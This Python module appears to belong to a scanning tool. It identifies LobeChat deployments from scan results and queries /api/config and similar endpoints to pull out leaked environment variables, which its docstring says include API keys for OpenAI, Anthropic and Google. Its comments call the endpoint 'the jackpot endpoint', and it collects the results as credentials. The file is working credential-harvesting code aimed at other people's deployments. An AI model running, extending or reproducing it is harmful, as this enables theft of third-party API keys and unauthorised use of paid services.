"""LobeChat prober — environment variable leak via /api/config.

LobeChat deployments frequently expose ``/api/config`` which returns client-side
configuration including all environment variables (API keys for OpenAI,
Anthropic, Google, etc.) when misconfigured. This is the P1 target in
FINGERPRINTS.md.
"""

from __future__ import annotations

import logging
from typing import Any

from ...models import Credential
from ..base import Prober

log = logging.getLogger(__name__)


class LobeChatProber(Prober):
    product_name = "lobechat"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "lobe-chat" in blob or "lobechat" in blob or "lobehub" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        creds: list[Credential] = []

        # /api/config dumps all client-side env vars — the jackpot endpoint.
        for path in ("/api/config", "/api/client/config", "/api/env"):
            resp = await self._get(self._url(hit, path))
            found = self._extract_from_response(resp, hit, f"lobechat_{path.strip('/').replace('/', '_')}")
            creds.extend(found)

        return creds
